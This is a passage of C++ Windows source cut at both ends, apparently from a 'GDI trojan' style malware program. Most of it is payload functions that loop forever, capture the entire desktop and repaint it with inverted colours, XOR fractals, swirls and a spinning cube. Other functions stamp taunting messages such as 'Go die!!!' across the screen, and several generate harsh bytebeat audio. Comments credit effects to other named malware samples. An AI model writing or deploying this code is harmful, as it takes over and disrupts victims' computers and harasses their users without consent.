        BitBlt(hcdc, x, y, w, h, hcdc, 0, 0, SRCCOPY);
        AlphaBlend(hdc, 0, 0, w, h, hcdc, 0, 0, w, h, blf);
        ReleaseDC(0, hdc);
        DeleteDC(hcdc);
        DeleteObject(bm);
        Sleep(100);
    }
}
DWORD WINAPI Payload4_c_TextOut(LPVOID lpParam) {
    while (1 + 1 == 2) {
        HDC hdc = GetDC(0);
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        HFONT hFont = CreateFontA(200, 0, 0, FW_THIN, 0, 0, 0, 0, ANSI_CHARSET, 0, 0, 0, 0, "114514");
        SelectObject(hdc, hFont); SetBkMode(hdc, 0); SetTextColor(hdc, RndRGB);
        LPCSTR text[] = { "No N17Pro3426.","You just a dumb loser.","Do you like this feel??","Still using this conputer?","uiui","R.I.P N17Pro3426","MazeIcon is a skidder!!","MazeIcon,What is Noskidium??","Go die!!!","What are you thinking??","cmm1.0.exe" };
        int rrr = rand() % 11; TextOutA(hdc, rand() % (w / 2), rand() % (h / 2), text[rrr], strlen(text[rrr]));
        ReleaseDC(0, hdc);
        DeleteObject(hFont);
        Sleep(100);
    }
}
struct Point3D {
    float x, y, z;
};
Point3D RotatePoint(Point3D p, float x, float y, float z) {
    float cosX = cos(x), sinX = sin(x);
    float cosY = cos(y), sinY = sin(y);
    float cosZ = cos(z), sinZ = sin(z);
    float y2 = p.y * cosX - p.z * sinX;
    float z2 = p.y * sinX + p.z * cosX;
    p.y = y2;
    p.z = z2;
    float x2 = p.x * cosY + p.z * sinY;
    z2 = -p.x * sinY + p.z * cosY;
    p.x = x2;
    p.z = z2;
    x2 = p.x * cosZ - p.y * sinZ;
    y2 = p.x * sinZ + p.y * cosZ;
    p.x = x2;
    p.y = y2;
    return(p);
}
VOID DrawCube(HDC hdc, Point3D center, float size, float angleX, float angleY, float angleZ) {
    Point3D ver[8] = {
        {-size , -size, -size},
        {size,  -size, -size},
        {size, size, -size},
        {-size, size, -size},
        {-size, -size, size},
        {size, -size, size},
        {size, size, size},
        {-size, size, size}
    };
    POINT scrP[8];
    for (int i = 0; i < 8; ++i) {
        Point3D rotated = RotatePoint(ver[i], angleX, angleY, angleZ);
        int screenX = static_cast<int>(center.x + rotated.x);
        int screenY = static_cast<int>(center.y + rotated.y);
        scrP[i].x = screenX;
        scrP[i].y = screenY;
    }
    POINT pl1[5] = { scrP[0],scrP[1],scrP[2],scrP[3],scrP[0] };
    Polyline(hdc, pl1, 5);
    POINT pl2[5] = { scrP[4],scrP[5],scrP[6],scrP[7],scrP[4] };
    Polyline(hdc, pl2, 5);
    POINT conL[8] = { scrP[0],scrP[4],scrP[1],scrP[5],scrP[2],scrP[6],scrP[3],scrP[7] };
    Polyline(hdc, &conL[0], 2);
    Polyline(hdc, &conL[2], 2);
    Polyline(hdc, &conL[4], 2);
    Polyline(hdc, &conL[6], 2);
    for (int i = 0; i < 8; i++) {
        DrawIcon(hdc, scrP[i].x, scrP[i].y, LoadIcon(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_ICON2)));
    }
}
DWORD WINAPI Payload4_d_Cube(LPVOID lpParam) {//from AWJDXUGE Camera.exe
    int x = 0, y = 0;
    float x2 = 0, y2 = 0;
    float x3 = 0, y3 = 0, z = 0;
    int signX = 10, signY = 10;
    for (;;) {
        HDC hdc = GetDC(0);
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        x += signX; y += signY;
        x2 += signX;
        y2 += signY;
        if (x <= 0) { signX = 10; x2 = 95; }
        if (y <= 0) { signY = 10; y2 = 95; }
        if (x + 100 >= w) { signX = -10; x2 = w - 95; }
        if (y + 100 >= h) { signY = -10; y2 = h - 95; }
        SelectObject(hdc, CreatePen(0, 1, RndRGB));
        DrawCube(hdc, { x2, y2, 0.0f }, 100, x3, y3, z);
        x3 += 0.04;
        y3 += 0.04;
        z += 0.04;
        ReleaseDC(0, hdc);
        Sleep(100);
    }
}
DWORD WINAPI Shader8_Gourd2(LPVOID lpParam) {//from pankoza's 2,3,7,8-Tetrachlorodibenzodioxin.exe 
    HDC hdc = GetDC(NULL);
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    BITMAPINFO bmpi = { 0 };
    HBITMAP bmp;
    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = w;
    bmpi.bmiHeader.biHeight = h;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;
    RGBQUAD* rgbquad = NULL;
    HSL hslcolor;
    for (;;) {
        hdc = GetDC(NULL); HDC hdcCopy = CreateCompatibleDC(hdc);
        if (hdcCopy == NULL) { ReleaseDC(0, hdc); continue; }
        bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
        SelectObject(hdcCopy, bmp);
        INT i = 0;
        while (1) {
            hdc = GetDC(NULL);
            StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
            RGBQUAD rgbquadCopy;
            for (int x = 0; x < w; x++) {
                for (int y = 0; y < h; y++) {
                    int index = y * w + x;
                    double fractalX = (2.5f / w);
                    double fractalY = (1.90f / h);
                    double cx = x * fractalX - 2.f;
                    double cy = y * fractalY - 0.95f;
                    double zx = 0;
                    double zy = 0;
                    int fx = 0;
                    while (((zx * zx) + (zy * zy)) < 10 && fx < 50) {
                        double fczx = zx * zx - zy * zy + cx;
                        double fczy = 2 * zx * zy + cy;
                        zx = fczx;
                        zy = fczy;
                        fx++;
                        rgbquad[index].rgbRed += fx;
                        rgbquad[index].rgbGreen += fx;
                        rgbquad[index].rgbBlue += fx;
                    }
                }
            }
            i++;
            StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, NOTSRCERASE);
            ReleaseDC(NULL, hdc);
        }
    }
}
DWORD WINAPI Shader9_NoName(LPVOID lpParam) {
    HDC hdcScreen = GetDC(0);
    INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    BITMAPINFO bmi = { 0 };
    PRGBQUAD rgbScreen = { 0 };
    bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
    bmi.bmiHeader.biBitCount = 32;
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biWidth = w;
    bmi.bmiHeader.biHeight = h;
    for (;;) {
        hdcScreen = GetDC(0); HDC hdcMem = CreateCompatibleDC(hdcScreen);
        if (hdcMem == NULL) { ReleaseDC(NULL, hdcScreen); continue; }
        HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
        SelectObject(hdcMem, hbmTemp);
        for (;;) {
            hdcScreen = GetDC(0);
            BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
            for (int i = 0; i < w * h; i++) {
                rgbScreen[i].rgb += 255;
            }
            BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
            ReleaseDC(NULL, hdcScreen);
            Sleep(100);
        }
    }
}
DWORD WINAPI Shader10_Wall3(LPVOID lpParam) {
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);
    BITMAPINFO bmi = { 0 };
    bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
    bmi.bmiHeader.biWidth = w;
    bmi.bmiHeader.biHeight = -h;
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biBitCount = 32;
    bmi.bmiHeader.biCompression = BI_RGB;
    RGBQUAD* pBits = nullptr;
    srand(time(NULL));
    while (true) {
        HDC hdc = GetDC(NULL); HDC hcdc = CreateCompatibleDC(hdc);
        HBITMAP hBitmap = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&pBits, NULL, 0);
        if (hcdc == NULL || hBitmap == NULL) { ReleaseDC(NULL, hdc); continue; }
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int y = 0; y < h; ++y) {
            for (int x = 0; x < w; ++x) {
                int index = x ^ y * w;
                BYTE originalRed = pBits[index].rgbRed;
                BYTE originalGreen = pBits[index].rgbGreen;
                BYTE originalBlue = pBits[index].rgbBlue;
                BYTE fractalRed = (x ^ y) * 9;
                BYTE fractalGreen = (x ^ y) * 9;
                BYTE fractalBlue = x ^ y ^ 9;
                pBits[index].rgbRed = static_cast<BYTE>(0.5 * originalRed + 0.5 * fractalRed);
                pBits[index].rgbGreen = static_cast<BYTE>(0.5 * originalGreen + 0.5 * fractalGreen);
                pBits[index].rgbBlue = static_cast<BYTE>(0.5 * originalBlue + 0.5 * fractalBlue);
                pBits[index].rgbRed = static_cast<BYTE>(pBits[index].rgbRed * 0.8);
                pBits[index].rgbGreen = static_cast<BYTE>((pBits[index].rgbGreen * 0.8));
                pBits[index].rgbBlue = static_cast<BYTE>(pBits[index].rgbBlue * 0.8);
                pBits[index].rgbRed = static_cast<BYTE>(0.3 * fractalBlue + 0.6 * fractalGreen);
                pBits[index].rgbGreen = static_cast<BYTE>(0.3 * fractalRed + 0.6 * fractalBlue);
                pBits[index].rgbBlue = static_cast<BYTE>(0.3 * fractalGreen + 0.6 * fractalRed);
            }
        }
        BLENDFUNCTION blur;
        blur.BlendOp = AC_SRC_OVER;
        blur.BlendFlags = 0;
        blur.AlphaFormat = 0;
        blur.SourceConstantAlpha = 50;
        AlphaBlend(hdc, 0, 0, w, h, hcdc, 0, 0, w, h, blur);
        ReleaseDC(NULL, hdc);
        DeleteDC(hcdc);
        DeleteObject(hBitmap);
    }
}
DWORD WINAPI Shader11_NoName2(LPVOID lpParam) {
    HDC hdcScreen = GetDC(0);
    INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    BITMAPINFO bmi = { 0 };
    PRGBQUAD rgbScreen = { 0 };
    bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
    bmi.bmiHeader.biBitCount = 32;
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biWidth = w;
    bmi.bmiHeader.biHeight = h;
    for (;;) {
        hdcScreen = GetDC(NULL);
        HDC hdcMem = CreateCompatibleDC(hdcScreen);
        if (hdcMem == 0) { ReleaseDC(0, hdcScreen); continue; }
        HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
        SelectObject(hdcMem, hbmTemp);
        for (int t = 0;; t++) {
            hdcScreen = GetDC(0);
            BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
            for (int i = 0; i < w * h; i++) {
                int tmp = (rgbScreen[i].r + rgbScreen[i].g + rgbScreen[i].b) / 3;
                rgbScreen[i].rgb = (RGB(tmp, tmp, tmp) + t - int(sqrt(i))) % (RGB(255, 255, 255));
            }
            BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
            ReleaseDC(0, hdcScreen); Sleep(10);
        }
    }
}
DWORD WINAPI Payload5_Swirl(LPVOID lpParam) {
    while (true) {
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
        if (hcdc == 0) { ReleaseDC(0, hdc); continue; }
        HBITMAP bm = CreateCompatibleBitmap(hdc, w, h);
        SelectObject(hcdc, bm);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        POINT p[3];
        for (int y = 0; y < h; y += 200) {
            p[0].x = 0; p[0].y = y;
            p[1].x = w; p[1].y = y;
            p[2].x = 50; p[2].y = y + 50;
            PlgBlt(hcdc, p, hcdc, 0, y, w, 50, NULL, 0, 0);
            p[0].x = p[2].x; p[0].y = p[2].y;
            p[1].x = w + 50; p[1].y = y + 50;
            p[2].x = -50; p[2].y = y + 150;
            PlgBlt(hcdc, p, hcdc, 0, y + 50, w, 100, NULL, 0, 0);
            p[0].x = p[2].x; p[0].y = p[2].y;
            p[1].x = w - 50; p[1].y = y + 150;
            p[2].x = 50; p[2].y = y + 200;
            PlgBlt(hcdc, p, hcdc, 0, y + 150, w, 50, NULL, 0, 0);
        }
        for (int x = 0; x < w; x += 200) {
            p[0].y = 0; p[0].x = x;
            p[2].y = h; p[2].x = x;
            p[1].y = 50; p[1].x = x + 50;
            PlgBlt(hcdc, p, hcdc, x, 0, 50, h, NULL, 0, 0);
            p[0].y = p[1].y; p[0].x = p[1].x;
            p[2].y = h + 50; p[2].x = x + 50;
            p[1].y = -50; p[1].x = x + 150;
            PlgBlt(hcdc, p, hcdc, x + 50, 0, 100, h, NULL, 0, 0);
            p[0].y = p[1].y; p[0].x = p[1].x;
            p[2].y = h - 50; p[2].x = x + 150;
            p[1].y = 0; p[1].x = x + 200;
            PlgBlt(hcdc, p, hcdc, x + 150, 0, 50, h, NULL, 0, 0);
        }
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc);
        DeleteDC(hcdc); DeleteObject(bm);
    }
}
DWORD WINAPI Shader12_NoName3(LPVOID lpParam) {//from XUGE
    HDC hdcScreen = GetDC(NULL);
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    BITMAPINFO bmi = { 0 };
    PRGBQUAD prgbScreen = { 0 };
    HDC hdcTempScreen;
    HBITMAP hbmScreen;
    bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
    bmi.bmiHeader.biBitCount = 32;
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biWidth = w;
    bmi.bmiHeader.biHeight = h;
    for (;;) {
        hdcScreen = GetDC(NULL); hdcTempScreen = CreateCompatibleDC(hdcScreen);
        if (hdcTempScreen == NULL) { ReleaseDC(0, hdcScreen); continue; }
        hbmScreen = CreateDIBSection(hdcScreen, &bmi, 0, (void**)&prgbScreen, NULL, 0);
        SelectObject(hdcTempScreen, hbmScreen);
        for (int t = 0;; t++) {
            hdcScreen = GetDC(NULL);
            BitBlt(hdcTempScreen, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
            for (int i = 0; i < w * h; i++) {
                int r = GetRValue(prgbScreen[i].rgb);
                int g = GetGValue(prgbScreen[i].rgb);
                int b = GetBValue(prgbScreen[i].rgb);
                prgbScreen[i].rgb = RGB((r + 100) % 256, ((r + g + b) / 4 + t) % 256, ((r + g + b) / 4 + i) % 256) % (RGB(255, 255, 255)) + t * 10;
            }
            BitBlt(hdcScreen, 0, 0, w, h, hdcTempScreen, 0, 0, SRCCOPY);
            ReleaseDC(NULL, hdcScreen);
            Sleep(10);
        }
    }
}
DWORD WINAPI Shader13_NoName4(LPVOID lpParam) {
    HDC hdcScreen = GetDC(NULL);
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    BITMAPINFO bmi = { 0 };
    PRGBQUAD prgbScreen = { 0 };
    HDC hdcTempScreen;
    HBITMAP hbmScreen;
    bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
    bmi.bmiHeader.biBitCount = 32;
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biWidth = w;
    bmi.bmiHeader.biHeight = h;
    for (;;) {
        hdcScreen = GetDC(NULL); hdcTempScreen = CreateCompatibleDC(hdcScreen);
        if (hdcTempScreen == 0) { ReleaseDC(0, hdcScreen); continue; }
        hbmScreen = CreateDIBSection(hdcScreen, &bmi, 0, (void**)&prgbScreen, NULL, 0);
        SelectObject(hdcTempScreen, hbmScreen);
        for (;;) {
            hdcScreen = GetDC(NULL);
            BitBlt(hdcTempScreen, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
            for (int i = 0; i < w * h; i++) {
                prgbScreen[i].r += 10;
                prgbScreen[i].g += 10;
                prgbScreen[i].b += 10;
            }
            BitBlt(hdcScreen, 0, 0, w, h, hdcTempScreen, 0, 0, SRCCOPY);
            ReleaseDC(NULL, hdcScreen);
            Sleep(10);
        }
    }
}
DWORD WINAPI Payload6_Big2(LPVOID lpParam) {//from ModifiedEnternalRed
    int rx;
    HDC desk = GetDC(0);
    int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
    double moveangle = 0;
    while (1) {
        desk = GetDC(0);
        rx = rand() % sw;
        int ax = (int)(cos(moveangle) * 5);
        SelectObject(desk, CreateSolidBrush(RGB(rand() % 500, rand() % 500, rand() % 500)));
        int ay = (int)(sin(moveangle) * 5);
        BitBlt(desk, rx, 10, 100, sh, desk, rx, 0, PATINVERT);
        BitBlt(desk, rx, -10, -100, sh, desk, rx, 0, PATINVERT);
        StretchBlt(desk, ax, ay, sw, sh, desk, 5, 5, sw - 10, sh - 10, SRCCOPY);
        moveangle = fmod(moveangle + PI / 16.f, PI * 2.f);
        Sleep(25);
    }
    ReleaseDC(0, desk);
}
DWORD WINAPI Shader14_NoName5(LPVOID lpParam) {//from ModifiedEnternalRed
    HDC desk = GetDC(0);
    int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
    HBITMAP h;
    HDC hdcSrc;
    void* lpvBits;
    lpvBits = VirtualAlloc(0, 4 * sw * (sh + 1), 0x3000u, 4u);
    for (int i = 0; ; i = (i + 5) % 2) {
        desk = GetDC(0);
        hdcSrc = CreateCompatibleDC(desk);
        if (hdcSrc == NULL) { ReleaseDC(0, desk); continue; }
        h = CreateBitmap(sw, sh, 1u, 0x20u, lpvBits);
        SelectObject(hdcSrc, h);
        BitBlt(hdcSrc, 0, 0, sw, sh, desk, 0, 0, 0xCC0020u);
        GetBitmapBits(h, 4 * sh * sw, lpvBits);
        
        for (int j = 0; sh * sw > j; ++j) {
            *((BYTE*)lpvBits + 4 * j + (rand() % 2 * 25)) -= 15;
        }
        SetBitmapBits(h, 4 * sh * sw, lpvBits);
        BitBlt(desk, 0, 0, sw, sh, hdcSrc, 0, 0, 0xCC0020u);
        DeleteObject(h);
        DeleteObject(hdcSrc);
        DeleteObject(desk);
        ReleaseDC(GetDesktopWindow(), desk);
        DeleteDC(hdcSrc);
    }
}
DWORD WINAPI Shader15_Wall4_last(LPVOID lpParam) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    LPCSTR text[] = { "No N17Pro3426.","You just a dumb loser.","Do you like this feel??","Still using this conputer?","uiui","R.I.P N17Pro3426","MazeIcon is a skidder!!","MazeIcon,What is Noskidium??","Go die!!!","What are you thinking??","cmm1.0.exe" };
    BITMAPINFO bmi = { 0 };
    bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
    bmi.bmiHeader.biBitCount = 32;
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biWidth = w;
    bmi.bmiHeader.biHeight = h;
    PRGBQUAD prgbScreen;
    HDC hdc = GetDC(NULL);
    for (;;) {
        hdc = GetDC(0); HDC hcdc = CreateCompatibleDC(hdc);
        if (hcdc == 0) { ReleaseDC(0, hdc); continue; }
        HBITMAP hBitmap = CreateDIBSection(hdc, &bmi, 0, (void**)&prgbScreen, NULL, 0);
        SelectObject(hcdc, hBitmap);
        for (;;) {
            HDC hdc = GetDC(NULL);
            BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
            for (int x = 0; x < w; x++) {
                for (int y = 0; y < h; y++) {
                    prgbScreen[x + w * y].rgb = x ^ y;
                }
            }
            BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCINVERT);
            HFONT font = CreateFontA(rand() % 100, 0, 0, FW_THIN, 0, 0, 0, 0, ANSI_CHARSET, 0, 0, 0, 0, "114514");
            HBRUSH color = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
            SetBkMode(hdc, 0);
            SetTextColor(hdc, RGB(rand() % 255, rand() % 255, rand() % 255));
            SelectObject(hdc, font);
            int rrr = rand() % 5; TextOutA(hdc, rand() % (w - (w / 2)), rand() % h, text[rrr], strlen(text[rrr]));
            DeleteObject(font);
            DeleteObject(color);
            ReleaseDC(0, hdc);
        }
    }
}
VOID WINAPI sound1() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t * (t >> ((t >> 9) | (t >> 8)) & (63 & (t >> 4))));
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound2() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 16000, 16000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[16000 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(((t >> 8 & t >> 4) >> ((t >> 10) & (t >> 8) & 31)) * t | t << t * (rand()));
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound3() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 16000, 16000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[16000 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t * (t & t >> 12) * (t >> 4 | t >> 8));
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound4() {//made by myself
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[11025 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t * (t >> 5 & (t & 8192 ? 255 : t >> 3)));
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound5() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t * (t ^ t + (t >> 15 & 1) ^ (t - 1280 ^ t) >> 10));
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound6() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((t * 5 & t >> 6) + (t * 5 & t >> 8) + rand() % 48);
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound7() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((t & 6) * t / 43 & (t * t + 45) | (t << t * (rand() % 255) & t >> 9));
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound8() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 22050, 22050, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[22050 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((t ^ t >> 12) * t >> 8);
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound9() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[11025 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t ^ (t >> 8) | (t << 4) & (t >> 4) & (t * (5 - (2 & t >> 13))) + rand());
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound10() {//made by myself
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(((0 - t) * 23 >> 4 | t & 3 >> 5 | t ^ 6) | t >> (t & 16234 ? 4 : 5));
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound11() {//made by myself
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[32000 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t * 4 | ((t >> 9 & t >> 3) >> (t >> 17)) | t | t << t * (rand()));
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound12() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
